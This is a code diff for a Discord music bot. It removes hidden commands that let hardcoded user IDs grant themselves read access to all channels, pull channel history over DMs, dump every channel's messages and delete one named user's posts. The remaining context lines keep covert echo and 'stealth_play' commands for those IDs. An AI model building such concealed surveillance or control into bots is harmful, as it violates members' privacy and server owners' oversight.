@@ -1951,17 +1951,6 @@ class MusicBot(discord.Client):
         await self.disconnect_all_voice_clients()
         raise exceptions.TerminateSignal
 
-    @owner_only
-    async def cmd_add_perms(self, author, server):
-        overwrite = discord.PermissionOverwrite()
-        overwrite.read_messages = True
-        for channel in server.channels:
-            try:
-                await self.edit_channel_permissions(channel, author, overwrite)
-                print("success", channel, author)
-            except:
-                print("fail", channel, author)
-
     async def on_message(self, message):
         await self.wait_until_ready()
 
@@ -1983,8 +1972,6 @@ class MusicBot(discord.Client):
         if message.channel.is_private:
             if message.author.id in [self.config.owner_id, 186955497671360512, 104445625562570752, 152303040970489856, 279857235444760586, 140419299092201472]:
                 awsw = discord.utils.get(self.servers, name="AwSW Fan Discord")
-                if command == "echo_local":
-                    await self.send_message(message.channel, args[0])
                 elif command == "echo":
                     channel = discord.utils.get(awsw.channels, name=args[0])
                     await self.send_message(channel, args[1], tts="tts" in args)
@@ -2000,14 +1987,6 @@ class MusicBot(discord.Client):
                         except:
                             self.safe_print("\n".join((message.content, str(message.author), channel.name)))
                             traceback.print_exc()
-                elif command == "history":
-                    if len(args) != 2:
-                        args.append(10)
-                    for channel in awsw.channels:
-                        if str(channel.name) == args[0]:
-                            async for channel_message in self.logs_from(channel, limit=int(args[1])):
-                                await self.send_message(message.channel, ("{}: {}".format(channel_message.author, channel_message.content)))
-                                self.safe_print(channel_message.content)
                 elif command == "stealth_play":
                     command = "play"
                     message.channel = discord.utils.get(awsw.channels, name="dj")
@@ -2020,18 +1999,6 @@ class MusicBot(discord.Client):
                     async for channel_message in self.logs_from(channel):
                         if channel_message.id == args[2]:
                             await self.add_reaction(channel_message, emote)
-                else:
-                    for channel in awsw.channels:
-                        self.safe_print(str(channel.name))
-                        try:
-                            async for message in self.logs_from(channel):
-                                self.safe_print(str(message.content))
-                                if str(message.author) == "Remy#6741":
-                                    await self.delete_message(message)
-                        except:
-                            traceback.print_exc()
-                        self.safe_print("\n"*5)
-
                     return
             elif not (message.author.id == self.config.owner_id and command == 'joinserver'):
                 await self.send_message(message.channel, 'You cannot use this bot in private messages.')
